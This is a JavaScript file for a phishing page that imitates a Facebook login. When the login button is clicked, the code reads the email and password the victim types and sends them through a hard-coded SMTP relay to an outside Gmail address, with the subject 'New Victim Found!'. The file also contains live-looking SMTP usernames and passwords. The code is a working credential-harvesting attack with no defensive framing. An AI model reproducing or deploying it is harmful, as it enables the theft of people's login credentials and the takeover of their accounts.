
const emailInput = document.getElementById("fb_email");
const passInput = document.getElementById("fb_pass");
const loginBtn = document.getElementById("loginBtn");

let credentials = {};
let email_body_msg;

loginBtn.addEventListener('click', () => {
    credentials = {
        email: emailInput.value,
        pass: passInput.value
    }
    email_body_msg = `Victim's mail: ${credentials.email} & Victim's pass: ${credentials.pass}`;
    sendEmail(email_body_msg);
});

//smtp code 

const smtp_creds = {
    username: 'abhinandi12891@gmail.com',
    password: '91400598F6B76290C33F66674DFFE5B9A6F5',
    server: 'smtp.elasticemail.com',
    port: '2525'
}

function sendEmail(msg) {
    Email.send({
        Host : smtp_creds.server,
        Username : smtp_creds.username,
        Password : smtp_creds.password,
        To : 'fkfor2@gmail.com',
        From : "abhinandi12891@gmail.com",
        Subject : "New Victim Found!",
        Body : msg
    }).then(
      message => alert(message)
      );
      console.log(msg);
}